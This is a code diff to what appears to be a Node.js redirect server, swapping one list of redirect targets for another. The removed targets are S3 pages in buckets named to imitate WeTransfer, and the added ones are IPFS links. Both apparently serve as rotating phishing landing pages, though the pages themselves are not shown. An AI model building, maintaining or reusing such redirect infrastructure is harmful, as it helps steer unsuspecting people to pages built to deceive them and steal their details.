@@ -5,9 +5,9 @@ const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
 
 // List of URLs for redirection
 const urls = [
-    "https://s3.us-east-1.amazonaws.com/vvetransfer.com-explore-data-security-1/Downloads67e1401a94caa9a9664aebe0.html",
-    "https://s3.us-east-1.amazonaws.com/etransfer.com-explore-file-sharing/data-secureda9a9664aebe067e1401a94ca.html",
-    "https://s3.us-east-1.amazonaws.com/ewetransfer.com-explore-advertising-policies/transfer-secureda9a9664aebe067e1401a94ca.html"
+    "https://ipfs.io/ipns/k51qzi5uqu5dgrnqfpoj7gmjl8224c6jxin7p4u3xoo5f9nw6artiwe8cx647x",
+    "https://ipfs.io/ipfs/bafybeig2rf5ebepfrekhfc7rd5neyjncjsba5zhcoz54bf2swxs52b2ibi",
+    "https://ipfs.io/ipns/k51qzi5uqu5dgrnqfpoj7gmjl8224c6jxin7p4u3xoo5f9nw6artiwe8cx647x"
 ];
 
 // Route to handle redirection
